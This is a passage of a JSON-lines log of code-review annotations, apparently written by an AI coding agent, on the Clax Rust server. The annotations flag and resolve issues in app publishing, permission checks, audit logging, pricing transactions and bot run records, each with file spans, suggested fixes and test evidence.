app got through an 'anyone with the link' page cannot be published as a fork","tags":["review","app-push","severity:minor","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/remote_apps.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T17:06:46.545662Z","id":"f77093d7f478bfb23e97bb66be99ef45fbac36e291061122638ea333418650c3","body":{"kind":"resolve","ref":"git:d6dc23211","summary":"answer() (crates/clax-server/src/routes/remote_apps.rs) now sets Content-Security-Policy: sandbox; default-src 'none' and X-Content-Type-Options: nosniff on every answer it passes on. api_remotes_app::proxied_files_are_sandboxed_and_unsniffed (files/x.html, the files list and the head) passes under bazel test //crates/clax-server:integration__6, and fails at api_remotes_app.rs:1248 with the CSP value changed to default-src *.","supersedes":"f48025d1624fdd9d695a630c67924f13d622c64df303709af87961bb95ad4400","tags":["reason:fixed","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/app_bundles.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T19:18:59.101849Z","id":"b7cb1d466cf45df5c38584471ff375693b156af96932685fd14a106eb2fa9343","body":{"detail":"apps/clax_app/lib/remote/remote_api.dart recordInstall POSTs /api/artifacts/<id>/installs straight to the remote, with no Authorization and no Origin. crates/clax-http/src/hosted.rs anonymous_write takes such a request as from no session, and guest_need answers it At(aid, Artifacts, read), which guest_may passes only while the page is shared by link. A first publish makes the copy Restricted (public::push_app sends comments:false and no link access), so an app shared with named people counts no installs, though this route's doc and docs/contract.md (Installs) say anyone who may open the artifact counts. The core has no proxy for installs among crates/clax-server/src/routes/remote_apps.rs's routes, so a signed-in device cannot count with its token either.","kind":"concern","span":{"start":{"line":374},"end":{"line":383},"content_hash":"bcdcca3e98263b7158b5459d88f5889000e53918fe67517216e9204a3414c517"},"suggested_fix":"Add POST /api/remotes/<rid>/artifacts/<raid>/installs to remote_apps, forwarding with the core's token (InstallsRecord already takes a person's agent), and have the app use it when signed in to the copy's remote; or document that only link-shared apps count installs.","summary":"An install of a Restricted app is never counted: the Clax app posts installs with no token, and the hosted gate lets an anonymous request through only on a page shared by link","tags":["review","app-push","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/remote_apps.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T19:18:59.101908Z","id":"98d1bc779173ebb5c785f3626e4071d871525e2552bb96d1e43d9f601a5d8c3b","body":{"detail":"link() calls Store::link_remote(aid, rid, raid, url, a.current_version, remote_n): pushed_n is always the current version. apps/clax_app/lib/remote/link_remote.dart resolve() relinks an app after a new sign-in at link.baseRemoteVersion, while the person may have local versions past that base. crates/clax-store/src/linked.rs local_twin falls back to remote_links.pushed_n for a public version with no remote_versions row (an app got from a copy has none), so threads on public version remote_n are mirrored onto the person's newer local version; a non-app push (Mode::Update via clax push) would also start after current_version and skip the unpublished local versions. The body's url field is read and ignored (#[allow(dead_code)]).","kind":"concern","span":{"start":{"line":284},"end":{"line":291},"content_hash":"729c5e21c364e8a864fa81a5b9330ea9e1f326d8039f7e474e2e688874134d97"},"suggested_fix":"Take the local version the base corresponds to in the body (local_n, defaulting to current_version) and pass it to link_remote; the app knows it as the version it installed or took.","summary":"POST /api/remotes/<rid>/links bases the link on the local app's current version, not the version the app took, so a relinked app with local changes has its public base mapped to its changed version","tags":["review","app-push","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T19:18:59.103094Z","id":"b33b31caaed388fb563c217090b4895b33bb48d88fe29f4996ba0b49c0660733","body":{"detail":"Agent::also_needs (crates/clax-http/src/agent.rs:872-889) checks a PersonAgent with allowed_at over the grant's rights (person_rights, crates/clax-store/src/people.rs:1985: the preset plus shares), then the member with MemberRights::allows_at, which alone adds link access (crates/clax-http/src/hosted.rs:850-867). An app installed through an 'Anyone with the link' page is readable by the person but not named by any share, so the grant check may refuse forked_from 403 not_permitted, which the core turns into 502 remote_refused and the app retries forever (see the record on apps/clax_app/lib/remote/publisher.dart:740-758). crates/clax-server/tests/api_remotes_app.rs app_push_of_a_new_copy_records_forked_from forks only a copy shared with Sam by person. Unverified whether the collaborator preset reads every artifact.","kind":"concern","span":{"start":{"line":468},"end":{"line":473},"content_hash":"9bfe64df614736a1beaa1bad94a32d4154043947e1e36527886877fa265647bf"},"suggested_fix":"Add a test: Sam's device publishes a fork of a copy Ada shared by link only; if refused, have also_needs count link access for a person's device as the browser does.","summary":"A fork's forked_from read check uses the device grant's own rights, which may not count link access: Publish fork of an app shared only by link may be refused","tags":["review","area:remote","test","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/remote_apps.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-23T05:17:29.308221Z","id":"023ff7de3cb9c54e488e90ddc899e3fdf8919847210c85dd1d66d1464ddb0cf5","body":{"detail":"answer() forwards the remote's status and body unchanged. On a remote running main, GET /api/artifacts/<raid>/head, GET .../versions/<n>/bundle, PUT .../versions/<n>/bundle, GET /api/hosted/apps and PUT /api/hosted/artifacts/<raid>/comments do not exist (404 not_found), and GET/PUT/DELETE on /api/hosted/artifacts/<raid>/sharing|link|shares answer a token 403 browser_required (main's hosted.rs browser_only). The app cannot tell 'this server is too old' from 'the copy was deleted' or 'you may not': comment() (lines 690-700) reports the head's 404 for an existing copy, and the app's publisher drops a pending bundle on a 404 from the same remote (apps/clax_app/lib/remote/publisher.dart _upload). Nothing in the core detects the server's level.","kind":"concern","span":{"start":{"line":128},"end":{"line":160},"content_hash":"c60a8af29a7ff9856c6c22d979bc979f48487bc7165b7432e1849a658d2621b3"},"suggested_fix":"Give the core one check of the remote's level (a route or field this branch adds, read once per sign-in and kept on the remote row) and answer these routes 502 remote_too_old when it is missing, so the app can say the server needs an update instead of treating copies as gone.","summary":"Against a hosted Clax without this branch's routes, the forwarding routes pass its 404 and 403 browser_required through as if the copy were gone or forbidden","tags":["review","review:app-push-pull-deep","compat","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/remote_apps.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-23T05:19:00.471426Z","id":"7e50bdd31a1db94edcf6c2f7946143df32c66cfc96c7fd707186a0274adf835f","body":{"detail":"crates/clax-server/src/routes/remote_apps.rs:128-157: only 401, 3xx and out-of-range statuses are rewritten; 403 and 404 pass through with the remote's body. The comment route (remote_apps.rs:690-700) returns the head's non-2xx answer as is. `git show main:crates/clax-server/src/router.rs` has no /api/artifacts/{aid}/head or versions/{n}/bundle route, and `git show main:crates/clax-server/src/hosted.rs` routes (lines 1204-1248) have no /api/hosted/apps or /api/hosted/artifacts/{aid}/comments, while link/sharing/shares handlers call browser_only (hosted.rs:69-77, 403 browser_required on Authorization). apps/clax_app/lib/remote/publisher.dart:700-705 drops the pending bundle on a 404 when the remote link still matches. Nothing in the core records a remote's server level. Kind concern fits.","kind":"comment","references":"023ff7de3cb9c54e488e90ddc899e3fdf8919847210c85dd1d66d1464ddb0cf5","summary":"confirmed: answer() forwards an older remote's 404 and 403 browser_required unchanged, and the app treats a 404 as the copy gone","tags":["verified:confirmed","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/remote_apps.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-23T06:11:51.368945Z","id":"0b293dfe58aacc196b28a5402c88da946fb8e05f15de76577b69271d9a7fe7e2","body":{"kind":"resolve","ref":"git:526e6616b","summary":"Fixed: answer_or_too_old maps a 404 or 403 browser_required to remote_too_old when GET /api/hosted/apps is 404 there. Tests api_remotes_app::forwarding_to_a_public_clax_from_before_app_publishing_is_remote_too_old and a_current_public_clax_s_404_still_passes_through (//crates/clax-server:integration__6) pass; with the probe removed the first fails. bazelisk test (clax-store, clax-core, clax-http, clax-server lib + integration__1..6, clax-embed:old_homes, clax-mcp) at 3acda5ff0: 'Executed 15 out of 15 tests: 15 tests pass.'","supersedes":"023ff7de3cb9c54e488e90ddc899e3fdf8919847210c85dd1d66d1464ddb0cf5","tags":["reason:fixed","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/app_bundles.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-23T06:11:51.729157Z","id":"b52421f8d75590b04cdaa95e9d9d16ea0ed96ea986103215a06fa4e38b4cd155","body":{"kind":"resolve","ref":"git:09f4977df","summary":"Fixed on the core side: POST /api/remotes/<id>/artifacts/<raid>/installs forwards the install with the remote's token. Test api_remotes_app::an_install_of_a_restricted_copy_counts_through_the_core (//crates/clax-server:integration__6) passes; with the route renamed it gets 404 and fails. The app must call this route. bazelisk test (clax-store, clax-core, clax-http, clax-server lib + integration__1..6, clax-embed:old_homes, clax-mcp) at 3acda5ff0: 'Executed 15 out of 15 tests: 15 tests pass.'","supersedes":"b7cb1d466cf45df5c38584471ff375693b156af96932685fd14a106eb2fa9343","tags":["reason:fixed","session:claude-code:b2fb951f-3ceb-4c65-a7b7-a705e815488a"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/settings.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T00:01:13.452217Z","id":"f802b2577746bd8c2c400ffedb3d80c83fcca38a032585a8740609d3508e60ec","body":{"detail":"The handler is listed in UNAUDITED (crates/clax-server/src/routes/guards.rs) because it writes the home's config.toml, not the store. docs/superpowers/specs/2026-10-21-claxbot-design.md D13 and §9.1 ask that every view and op be recorded (admin.provider and view.admin are the nearest kinds), so a settings change, including a provider base_url that the API key is then sent to, leaves no trace today.","kind":"concern","span":{"start":{"line":107},"end":{"line":133},"content_hash":"77446062669b1fd396ab749bd6d9dbf72a5b0b432f8bbd9a604b6c3a98c2a088"},"suggested_fix":"Record an admin.settings {fields[]} event (keys only, never values of *_env or secrets) through DeferredAudit when the write succeeds, and a view event for GET, once the audit kinds of spec §9.1 land.","summary":"PUT /api/settings records no audit event: a change to config.toml is absent from the Toolpath journal","tags":["audit","claxbot","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/guards.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T00:02:19.571285Z","id":"d17535b11e80c5045b594e1a25d196ac75b6b59cbd8a6ac7f03e6d5abcbb73c6","body":{"detail":"Moved from crates/clax-server/src/routes/mod.rs:1360:1376, record be332351. CONTENT_VIEWS and PEOPLE_VIEWS list the calls that build views in this codebase (thread_view(, with_owner(, list_versions(, doc_get(, working.for_artifact(, question_view(, inbox_views(, grant_view(, Sse::new(, ...). A handler that serialises an Artifact or a Version directly (json!({\"artifact\": a})) or calls a helper that does is not seen. MUST_REFUSE pins the routes spec §7.5 names.","kind":"concern","ref":"git:acb06db9","span":{"start":{"line":1276},"end":{"line":1317},"content_hash":"81457863f5a6f37f002514515cebebced86ea812b3069431a7be337d750945e9"},"summary":"The Own and not_for_agents guards recognise views by source text","supersedes":"94ea07b55a16b4c4ffeddaa8c4d504a67628b52453cb4cce75fb3ab83bbcd5a6","tags":["session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/guards.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T00:02:19.601578Z","id":"be006817b9a722fa0f966c4d5564ef9da2b2a36a420f8c51ca361b2dc07ab083","body":{"detail":"Moved from crates/clax-server/src/routes/mod.rs:1757:1783, record 67937f34. Spec §8.6 allowlists two direct spawns. plugins/pi/src/daemon.ts also runs `<bin> --version` (binaryVersion) and `ensure-clax.sh` with no arguments (findBinary, which prints the binary's path). Neither reaches the daemon or the model's context, so the guard accepts them.","kind":"waiver","ref":"git:acb06db9","span":{"start":{"line":1835},"end":{"line":1862},"content_hash":"7f71bf114fe1097fe33129a4731be83874779de451bc001b519b8a25f9d989c6"},"summary":"Pi may run the binary directly for --version, and the wrapper with no arguments, beside serve --json and status --json","supersedes":"19fcbeeb8cafd40222838162fb99cf5bb7f6518ce17d0c8cd7fb6da6fd316c5c","tags":["session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/settings.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T00:19:49.422428Z","id":"921f8ced76d2758aa56d7da1ede5284a2ea56fe7e95c6393444ebcce21088c52","body":{"detail":"GET /api/settings calls s.settings.audit.viewed (crates/clax-server/src/routes/settings.rs:121) and a successful PUT calls s.settings.audit.changed with each key's old and new value and source (line 158); refused requests never reach it (api_settings::views_and_changes_reach_the_audit_hook_and_refusals_do_not). The trait is crates/clax-http/src/settings.rs:19 (SettingsAudit), installed as NoAudit by Settings::at_start. docs/superpowers/specs/2026-10-21-claxbot-design.md D13 and §9.1 require every view and op recorded: the integration task wires the hook to view.admin {page: \"settings\"} for viewed and an admin.settings {fields} kind for changed, once the store defines them. settings::put stays in UNAUDITED (crates/clax-server/src/routes/guards.rs) until then, since it takes no AuditCtx.","kind":"concern","span":{"start":{"line":133},"end":{"line":160},"content_hash":"f805fa92cbf3f8e3dbb1a23b4fc7701b22505464a3979833761e7983492334ca"},"suggested_fix":"Implement SettingsAudit over the store's audit writer and install it in AppState.settings at daemon start.","summary":"Settings views and changes reach only a no-op SettingsAudit hook: nothing is in the Toolpath journal yet","supersedes":"f802b2577746bd8c2c400ffedb3d80c83fcca38a032585a8740609d3508e60ec","tags":["audit","claxbot","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/settings.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T00:30:08.411175Z","id":"edc5a08b634da40328c8a2a8bbede3920b8b525577a6a12d3d12eef120316587","body":{"detail":"GET /api/settings calls sets.audit.viewed(store, &caller, keys) (crates/clax-server/src/routes/settings.rs:151) and a successful PUT calls sets.audit.changed(store, &caller, changes) with each key's old and new value and source (line 186), both inside the route's store_call on a store thread, with the Caller may_edit_settings admitted; refused requests never reach it (api_settings::views_and_changes_reach_the_audit_hook_and_refusals_do_not asserts the actor). The trait is crates/clax-http/src/settings.rs:24 (SettingsAudit), installed as NoAudit by Settings::at_start. docs/superpowers/specs/2026-10-21-claxbot-design.md D13 and §9.1 require every view and op recorded: the integration task implements the hook over the store to write view.admin {page: \"settings\"} for viewed and an admin.settings {fields} kind for changed, once the store defines them. settings::put stays in UNAUDITED (crates/clax-server/src/routes/guards.rs) until then, since it takes no AuditCtx.","kind":"concern","span":{"start":{"line":135},"end":{"line":194},"content_hash":"a8293d584d77bb4da77d9103321472607729c8ee97228cbb827eb94b7e5d4e6f"},"suggested_fix":"Implement SettingsAudit over the store's audit writer (actor from the Caller) and install it in AppState.settings at daemon start.","summary":"Settings views and changes reach only a no-op SettingsAudit hook: nothing is in the Toolpath journal yet","supersedes":"921f8ced76d2758aa56d7da1ede5284a2ea56fe7e95c6393444ebcce21088c52","tags":["audit","claxbot","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/toolpath.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T12:14:21.447738Z","id":"3ae84362e0ddb15d41ac1a11efdc384df0c2482e9d2d9b710cd2de1a6fb7769b","body":{"detail":"admin_reads_history admits a connected person whose role is admin (spec docs/superpowers/specs/2026-10-21-claxbot-design.md §9.2: admins read every audit event). The export refuses a `live` selection or an `artifact` that is a live page, but an export with no artifact selection renders every row, live pages' (owner-only, docs/contract.md 'Live pages') among them. GET /api/audit filters them out for anyone but the owner (crates/clax-server/src/routes/audit_trail.rs hide_live).","kind":"concern","span":{"start":{"line":304},"end":{"line":320},"content_hash":"cbe9480376a033c03d2f1a79fc340f4e33c2e6023afc64a2f812ed7231bddc53"},"suggested_fix":"Give Store::export a selection that leaves out the artifacts in live_ids for a reader who is not the owner.","summary":"An admin who is not the owner exports the whole history unfiltered, live pages' events included, unless the export names a live page","tags":["claxbot","audit","live-pages","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/audit_trail.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T12:14:21.447805Z","id":"255b5210ebacb42c7cd14c955de897d6569367e6ef244cf3bdd0e0d7857c34dc","body":{"detail":"query_audit pages by seq; hide_live then removes events whose artifact is a live page for every reader but the owner. The page is still correct (next_cursor continues it) but its length varies.","kind":"concern","span":{"start":{"line":148},"end":{"line":204},"content_hash":"1320ad5ea2d53b5aa1d399f72f580dbdbced33afd5b7e7c2d530a2cd7d243434"},"suggested_fix":"Pass the live page IDs into AuditQuery so the SQL leaves them out before LIMIT.","summary":"Live pages' events are dropped from an audit page after the store pages it, so a non-owner's page can come back short (even empty) with a next_cursor","tags":["claxbot","audit","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/bot.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T12:14:21.447860Z","id":"47da78c7fab75a64b33a9f683bd66b1bf7a43ca442525d6d12bc07d3d98b7d77","body":{"detail":"Spec §10's call shape is {op, target?, ok, ms, error?}; clax-bot's script step journals op, target, ok and code only (crates/clax-bot/src/script.rs calls_json), so the run panel's 'N calls · X ms' line reads 0 ms.","kind":"concern","span":{"start":{"line":1036},"end":{"line":1046},"content_hash":"2ee14524f32947446c766a2eae05b5a121ab5011ab17e9880e4b2376d0419eae"},"suggested_fix":"Record each host call's wall time in clax-bot's CallRecord and the step payload, and show it here.","summary":"A script call's `ms` in GET /api/bot/runs/<id> and in the call events is always 0: the run loop's call records carry no duration","tags":["claxbot","runs","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/admin.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T12:14:21.447900Z","id":"5ca12abdfe2e2c007cf6cbfa39b97b5bd509df8e7a55657c407936fd106a18d1","body":{"detail":"set_bot_settings, put_cost_line and delete_cost_line each commit on their own; a cost_line_in_use or invalid_cost_line partway leaves the earlier ones written (each recorded as admin.cost_line). The route's doc says so.","kind":"concern","span":{"start":{"line":648},"end":{"line":699},"content_hash":"62074578b6d20f8a4723230740dacc79cb10948866e1e8980c5fa51a078dafc8"},"suggested_fix":"A store method that applies the whole pricing object in one transaction.","summary":"PUT /api/admin/pricing applies the price, the free tier and each line in turn, not in one transaction: a refused line leaves the changes before it","tags":["claxbot","admin","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/bot.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T12:14:21.447984Z","id":"fc4266a7974914bd4862a968b481031b170f717b3cb72761e0f612c7aeb130f6","body":{"detail":"clax_server::bot::driver and start_driver are native only (cfg not wasm32); a Durable Object gets the default Bot (NoRuns, its own EventHub), so its runs stay queued and the stream replays committed steps only until the Worker installs a driver whose deps emit into AppState.bot.events (DriverRuns, Bot::keys from CLAX_KEK).","kind":"concern","span":{"start":{"line":1161},"end":{"line":1240},"content_hash":"0c79dbd19df5d7e751d70ac5ef736910c7067f695de0eadeb751641533bd99df"},"summary":"GET /api/bot/runs/<id>/events is mounted on both targets but tested natively only; the Worker's driver and hub are not wired","tags":["claxbot","worker","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/settings.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T12:14:44.493820Z","id":"29c7f3601f3c9ee9cf0e15415b82d9241fa0fa237f598922423d0d75427941a8","body":{"kind":"resolve","ref":"git:3b5c81af","summary":"Settings::at_start installs clax_http::bot::SettingsRecorded (crates/clax-http/src/bot.rs), which records view.admin {page: settings} once a window per viewer and admin.settings {fields} for a write; both kinds are in the store, Toolpath, redaction, goldens and docs/contract.md. Evidence: bazelisk test //crates/clax-server:integration__2 --test_arg=api_claxbot:: passes every_view_is_recorded_once_a_window (asserts the settings view and an admin.settings with fields [bot.max_steps]).","supersedes":"edc5a08b634da40328c8a2a8bbede3920b8b525577a6a12d3d12eef120316587","tags":["reason:fixed","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/admin.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T14:15:16.253481Z","id":"72e5f8082cd5527046b1e81f98c7c1b41ee7aecb253c941c136c85cb5f8ff52c","body":{"detail":"set_bot_settings, put_cost_line and delete_cost_line each commit on their own; a cost_line_in_use or invalid_cost_line partway leaves the earlier ones written (each recorded as admin.cost_line). The route's doc says so.","kind":"concern","span":{"start":{"line":654},"end":{"line":705},"content_hash":"62074578b6d20f8a4723230740dacc79cb10948866e1e8980c5fa51a078dafc8"},"suggested_fix":"A store method that applies the whole pricing object in one transaction.","summary":"PUT /api/admin/pricing applies the price, the free tier and each line in turn, not in one transaction: a refused line leaves the changes before it","supersedes":"5ca12abdfe2e2c007cf6cbfa39b97b5bd509df8e7a55657c407936fd106a18d1","tags":["claxbot","admin","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/bot.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T14:57:56.978189Z","id":"7bdd18ae3a6048d468b3d0b9ba640bfefd3d55105138f644bc31694a5dd1057f","body":{"detail":"Spec §10's call shape is {op, target?, ok, ms, error?}; clax-bot's script step journals op, target, ok and code only (crates/clax-bot/src/script.rs calls_json), so the run panel's 'N calls · X ms' line reads 0 ms.","kind":"concern","span":{"start":{"line":1041},"end":{"line":1051},"content_hash":"2ee14524f32947446c766a2eae05b5a121ab5011ab17e9880e4b2376d0419eae"},"suggested_fix":"Record each host call's wall time in clax-bot's CallRecord and the step payload, and show it here.","summary":"A script call's `ms` in GET /api/bot/runs/<id> and in the call events is always 0: the run loop's call records carry no duration","supersedes":"47da78c7fab75a64b33a9f683bd66b1bf7a43ca442525d6d12bc07d3d98b7d77","tags":["claxbot","runs","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/bot.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T14:57:57.064837Z","id":"831fc83568a8eb1d1354789e190b9ff6ee009403584d5dbd20a1365e2c53d591","body":{"detail":"clax_server::bot::driver and start_driver are native only (cfg not wasm32); a Durable Object gets the default Bot (NoRuns, its own EventHub), so its runs stay queued and the stream replays committed steps only until the Worker installs a driver whose deps emit into AppState.bot.events (DriverRuns, Bot::keys from CLAX_KEK).","kind":"concern","span":{"start":{"line":1166},"end":{"line":1245},"content_hash":"0c79dbd19df5d7e751d70ac5ef736910c7067f695de0eadeb751641533bd99df"},"summary":"GET /api/bot/runs/<id>/events is mounted on both targets but tested natively only; the Worker's driver and hub are not wired","supersedes":"fc4266a7974914bd4862a968b481031b170f717b3cb72761e0f612c7aeb130f6","tags":["claxbot","worker","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/admin.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T14:57:57.174341Z","id":"ab91e4a182df7a9ba3f368faf3d3d6c0d4e0ae8083dd364a09e1ac2f76666b64","body":{"detail":"set_bot_settings, put_cost_line and delete_cost_line each commit on their own; a cost_line_in_use or invalid_cost_line partway leaves the earlier ones written (each recorded as admin.cost_line). The route's doc says so.","kind":"concern","span":{"start":{"line":667},"end":{"line":718},"content_hash":"62074578b6d20f8a4723230740dacc79cb10948866e1e8980c5fa51a078dafc8"},"suggested_fix":"A store method that applies the whole pricing object in one transaction.","summary":"PUT /api/admin/pricing applies the price, the free tier and each line in turn, not in one transaction: a refused line leaves the changes before it","supersedes":"72e5f8082cd5527046b1e81f98c7c1b41ee7aecb253c941c136c85cb5f8ff52c","tags":["claxbot","admin","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/admin.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T14:25:51.711269Z","id":"7d87d031d07cd9149e04d16d22d96c8a0c1a0a68f2d555c7c42023a229a809ca","body":{"kind":"resolve","ref":"git:33be80f5","summary":"PUT /api/admin/pricing now checks every line before writing and applies the price, the free tier and all lines in one transaction (Store::replace_pricing, crates/clax-store/src/credits.rs). Evidence: api_claxbot::pricing_round_trips_and_usage_reports_the_week sends a whole object whose first line is relabelled, one line dropped and the last given margin_bp -5, and asserts 400 invalid_cost_line with the price and every line unchanged and no admin.cost_line event; bazelisk test //crates/clax-server:integration__2 passes it (148 passed, the one failure api_seats::load_150_people_on_100_seats, untouched code).","supersedes":"5ca12abdfe2e2c007cf6cbfa39b97b5bd509df8e7a55657c407936fd106a18d1","tags":["reason:fixed","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/bot.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T14:25:51.731444Z","id":"22067dff6e396abd19c2aaa042b91719dd38fe66db492ee2cabf74e84e5fa32a","body":{"kind":"resolve","ref":"git:33be80f5","summary":"The run loop now measures each script call (clax_bot::script CallLog.ms, timed with clax_rt::time::Instant around the host call, 0 for a call replayed from the journal), carries it on Event::Call and in the step's calls JSON, and the run routes serve it. Evidence: api_claxbot_run::a_thread_sent_to_claxbot_runs_streams_and_replays asserts the call event's ms is a number (call.2[\"call\"][\"ms\"].is_u64()); bazelisk test //crates/clax-server:integration__3 passes.","supersedes":"47da78c7fab75a64b33a9f683bd66b1bf7a43ca442525d6d12bc07d3d98b7d77","tags":["reason:fixed","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/bot.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T14:25:51.754103Z","id":"5b18c4b132540a20fc3a6f5ff32b79956810bd6e9aa6a0c5f01476278b152e23","body":{"detail":"after_run picks the newest viewer comment made on the run's threads since the run was created and starts one follow-up acting for its author, on their credits and rights. An earlier commenter's words are in that run's threads as data (from_sender false), but nothing runs for them on their own credits or rights, and the comment's answer told them run: {id, queued: true}. One run per commenter would need either a queue of follow-ups (each waiting on the previous, as one thread has one active run) or a merged run acting for several people, which the rights model does not have.","kind":"concern","span":{"start":{"line":782},"end":{"line":837},"content_hash":"47cdbd963f24b1be08f4f7dd5c70da7c90e518bd830f60a6629e3151e8e366fd"},"summary":"Comments by several people while a run works start one follow-up, for the newest commenter alone","tags":["claxbot","follow-up","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/settings.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T14:28:46.335514Z","id":"644692559a84a0eab868c4d83a165ebe35172f49d3269a10e77cd13863b3835a","body":{"detail":"The store clears the instance key when Store::set_bot_settings changes BaseUrl (the bot_settings row, which PUT /api/admin/provider writes). PUT /api/settings writes bot.base_url into config.toml with settings::write instead, which the daemon reads at its next start and which overrides the row; nothing clears the sealed instance key on that path, so after a restart the stored key is sent to the URL the file names. Admins who are not the owner may set bot.* there (routes::settings::owner_only_setting). Options: clear the key in this route when the write changes bot.base_url, or have the daemon clear it at start when the configured base URL differs from the one the key was stored for.","kind":"concern","span":{"start":{"line":218},"end":{"line":230},"content_hash":"a276450e379776a853c4ae5eda63b59c91143ebff3a54960facc54bb47d5fb44"},"summary":"PUT /api/settings writing a new bot.base_url to config.toml does not clear the stored instance key","tags":["claxbot","security","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
